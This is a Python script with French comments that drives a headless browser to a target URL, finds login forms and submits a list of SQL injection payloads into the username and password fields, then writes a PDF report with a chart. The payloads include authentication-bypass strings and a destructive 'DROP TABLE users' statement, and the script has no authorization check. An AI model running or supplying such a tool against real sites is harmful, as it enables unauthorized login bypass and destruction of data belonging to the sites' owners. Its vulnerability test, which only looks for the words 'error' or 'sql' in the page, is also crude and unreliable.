import asyncio
from playwright.async_api import async_playwright
import matplotlib.pyplot as plt
from fpdf import FPDF

# Fonction principale d'attaque SQLi
async def sql_injection_attack(target_ip):
    results = {"tested_forms": 0, "vulnerable_forms": 0, "payloads_tested": []}

    async with async_playwright() as p:
        # Lancer le navigateur en mode headless
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        # Aller à l'URL cible
        await page.goto(target_ip)

        # Détection de formulaire
        forms = await page.query_selector_all("form")
        if not forms:
            print("Aucun formulaire trouvé sur la page")
            await browser.close()
            return "Aucun formulaire sur la page"

        print(f"{len(forms)} formulaire(s) trouvé(s). Test d'injection SQL...")

        # Liste de payloads SQL communs
        sql_payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' OR 'a'='a",
        ]

        results["tested_forms"] = len(forms)

        # Parcourir les champs des formulaires trouvés
        for form in forms:
            inputs = await form.query_selector_all("input")
            login_field = None
            password_field = None

            for input_tag in inputs:
                input_type = await input_tag.get_attribute("type")
                input_name = await input_tag.get_attribute("name")

                if input_type in ["text", "email"]:
                    login_field = input_name
                elif input_type == "password":
                    password_field = input_name

            if login_field and password_field:
                print(f"Champs trouvés : {login_field} et {password_field}")

                for payload in sql_payloads:
                    # Remplir les champs avec les payloads SQL
                    await page.fill(f"input[name='{login_field}']", payload)
                    await page.fill(f"input[name='{password_field}']", payload)

                    # Soumettre le formulaire
                    await form.evaluate("form => form.submit()")

                    # Attendre que la page charge
                    await page.wait_for_timeout(2000)

                    # Vérifier si l'injection a réussi
                    page_content = await page.content()
                    if "error" in page_content.lower() or "sql" in page_content.lower():
                        print(f"Vulnérabilité détectée avec le payload : {payload}")
                        results["vulnerable_forms"] += 1
                        results["payloads_tested"].append(payload)
                        generate_report(target_ip, results)  
                        print(f"Vulnérabilité détectée avec le payload : {payload}")
                        await browser.close()
                        return f"Vulnérabilité détectée avec le payload : {payload}"

                print("Test terminé pour ce formulaire.")

        await browser.close()

    # Génération du rapport
    generate_report(target_ip, results)  
    return "Aucune vulnérabilité détectée."

# Fonction pour générer un rapport PDF avec un diagramme
def generate_report(target_ip, results):
    tested_forms = results["tested_forms"]
    vulnerable_forms = results["vulnerable_forms"]
    safe_forms = tested_forms - vulnerable_forms

    # Création d'un diagramme circulaire
    labels = ["Formulaires sécurisés", "Formulaires vulnérables"]
    values = [safe_forms, vulnerable_forms]
    colors = ["#4CAF50", "#FF5252"]

    plt.figure(figsize=(6, 6))
    plt.pie(values, labels=labels, autopct="%1.1f%%", startangle=90, colors=colors)
    plt.title("Résultats des tests d'injection SQL")
    plt.savefig("sqli_results.png")
    plt.close()

    # Génération du fichier PDF
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)

    # Titre
    pdf.set_font("Arial", style="B", size=16)
    pdf.cell(200, 10, txt="Rapport de test d'injection SQL", ln=True, align="C")
    pdf.ln(10)

    # Résumé
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"URL cible : {target_ip}", ln=True)
    pdf.cell(200, 10, txt=f"Formulaires testés : {tested_forms}", ln=True)
    pdf.cell(200, 10, txt=f"Formulaires vulnérables : {vulnerable_forms}", ln=True)
    pdf.cell(200, 10, txt=f"Formulaires sécurisés : {safe_forms}", ln=True)
    pdf.ln(10)

    # Ajout du diagramme
    pdf.cell(200, 10, txt="Diagramme des résultats :", ln=True)
    pdf.image("sqli_results.png", x=50, y=70, w=100)

    # Sauvegarde du PDF
    pdf.output("sqli_report.pdf")
    print("Rapport PDF généré : 'sqli_report.pdf'")
